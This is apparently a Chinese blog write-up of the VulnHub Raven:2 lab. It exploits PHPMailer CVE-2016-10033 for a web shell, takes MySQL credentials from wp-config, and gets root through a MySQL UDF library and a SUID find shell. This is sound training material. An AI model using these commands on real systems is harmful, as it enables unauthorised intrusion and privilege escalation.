---
title: Raven-2
author: Creexile
date: 2024-09-18 14:00:13
lastMod: 2025-04-10
summary: 'No.2'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [提权, UDF, 漏洞利用, 渗透]
---

# Raven: 2

---

No.3

> 来源: [vulnhub靶场-Raven:2](https://www.vulnhub.com/entry/raven-2,269/)
>
> 目标: There are four flags to capture
>
> 妙妙工具: python -c 'import pty; pty.spawn("/bin/bash")'

## 环境配置

kali: 192.168.56.6

Debian: 192.168.56.8

## 信息收集

老三件

```
nmap -sS 192.168.56.0/24
nmap -p- 192.168.56.8
nmap -A 192.168.56.8 -p 22,80,111,33925
```

端口 22,80,111,33925

系统信息: Linux 3.2 - 4.9 Debian 5

中间件: Apache-Web-Server 2.4.10, Bootstrap, PHPMailer 5.2.16

可能存在的漏洞: DS_Store found, 但是是扒拉源码的漏洞

扫描泄露的路径:

```
/vendor/
/wordpress/wp-login.php
/manual/index.html
/.DS_Store
```

稍微探索一下, 在`/vendor/PATH`路径下找到了flag1

```
/var/www/html/vendor/
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
```

博客的那个登录界面完全不能用了, 没有账号密码的情况下, 现在尝试利用中间件漏洞:

## getshell

`CVE-2016-10033 命令执行漏洞`, 看的描述是 PHPMailer< 5.2.18 都能用

[选择你的exp](https://www.exploit-db.com/search?cve=2016-10033), 详情界面中的EDB-ID就是kali中对应的文件名, 搜索即可找到; 这里选的40974

> 试了41962.sh和42221.py都试不出来, 很急
>
> msf似乎有一个`exploit/multi/http/phpmailer_arg_injection`可以用, 我这里也是转移shell到msf上了

```
searchsploit 40974
locate php/webapps/40974.py
cp /usr/share/exploitdb/exploits/php/webapps/40974.py /home/kali/Desktop/working/40974.py
```

先赋予权限再编辑:

![image-20240917165130405](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917165130405.png)

> 我这里总是出问题, 文件名是backdoor就出错, 我也很奇怪

运行成功结果如图, 说明已经写入, 监听设置的端口然后访问/backdoor.php即可拿到shell

```
nc -lvnp 8888
```

![image-20240917165301103](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917165301103.png)

然后继续信息收集:

```bash
whoami
# 权限: www-data
uname -a
# 系统: Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
gcc -v
# gcc环境: 有
service --status-all
# 其他服务: mysql
ps -aux|grep mysql
# 权限为root
```

在`/var/www/`发现flag2:

![image-20240917180558417](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917180558417.png)

利用find命令发现flag3:

```bash
find /var -name "flag*"
# /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
# 直接访问网页即可, /wordpress/wp-content/uploads/2018/11/flag3.png
```

![image-20240917181119877](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917181119877.png)

从根目录开始find, 发现很多没有权限以及假的flag, 没用, 考虑提权:

## 提权

结合开启的服务, 可以尝试利用mysql的udf提权; 账号密码一般在网站的配置文件中有:

比如`html/wordpress/wp-config.php`, 可以找到mysql账号密码

```
root : R@v3nSecurity
```

![image-20240917184514940](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917184514940.png)

先看看能不能满足udf提权的需要, 可

```mysql
mysql -uroot -pR@v3nSecurity
select version();
# 5.5.60-0+deb8u1
show global variables like 'secure%';
# secure_file_priv 为空才可以提权, 若为NULL和/tmp/等则不行, 此处为空
show variables like '%plugin%';
# plugin 的值为空时不可提权, 此处为 /usr/lib/mysql/plugin/
show variables like 'version_compile_%';
# x86_64
show databases;
# wordpress
# 另外, 因为禁止了远程登录, msf不能一把梭
```

> 利用条件:
>
> - mysql允许导入导出文件
> - 高权限用户启动，如root。该账号需要有对数据库`mysql`的insert和delete权限，其实是操作里面的`func`表，所以`func`表也必须存在。
> - 未开启`‑‑skip‑grant‑tables`。开启的情况下，UDF不会被加载，默认不开启

```bash
searchsploit mysql udf
# 省略复制到某文件夹的步骤, 下列步骤也在本地执行
gcc -g -c 1518.c
gcc -g -shared -o mysqludf.so 1518.o -lc
# 或者是 gcc -g -shared -Wl,-soname,1518.so -o mysqludf.so 1518.c -lc
```

![image-20240917195135879](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917195135879.png)

将文件上传到靶机, 进行后续操作:

```mysql
use wordpress;
create table shell(line blob);
# 创建表
insert into shell values(load_file('/tmp/mysqludf.so'));
# 插入二进制的mysqludf.so
select * from shell into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';
# 导出mysqludf.so
create function do_system returns integer soname 'mysqludf.so';
# 创建do_system自定义函数
select do_system('chmod u+s /usr/bin/find');
# 给find命令所有者的suid权限
select * from mysql.func;
# 检查函数是否有sys_eval
```

给予了suid权限就可以用find提权了, 看看是否为管理员权限

```bash
find `which find` -exec whoami \;
# 返回root
```

可以, 那就使用find命令来提权; 然后寻找flag4, 在`/root`目录下

```shell
find . -exec /bin/sh \; -quit
```

![image-20240917204835497](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917204835497.png)
